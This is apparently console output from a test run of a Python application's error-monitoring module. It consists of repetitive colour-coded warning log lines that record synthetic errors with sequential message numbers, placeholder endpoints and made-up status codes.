WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944917Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4778'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.944964Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4779'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945012Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4780'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945060Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4781'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945108Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4782'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945156Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4783'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945203Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4784'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945250Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4785'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945297Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4786'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945345Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4787'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945392Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4788'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945441Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4789'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945489Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4790'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945536Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4791'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945584Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4792'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4793'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945679Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4794'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945726Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4795'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945774Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4796'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945821Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4797'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945869Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4798'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.945921Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m96[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4799'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946011Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4800'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4801'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946140Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4802'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946196Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4803'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946257Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4804'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4805'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946355Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4806'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946408Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4807'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946461Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4808'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946513Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4809'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946576Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4810'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4811'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4812'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946724Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4813'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946773Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4814'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946821Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4815'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946871Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4816'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946919Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4817'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
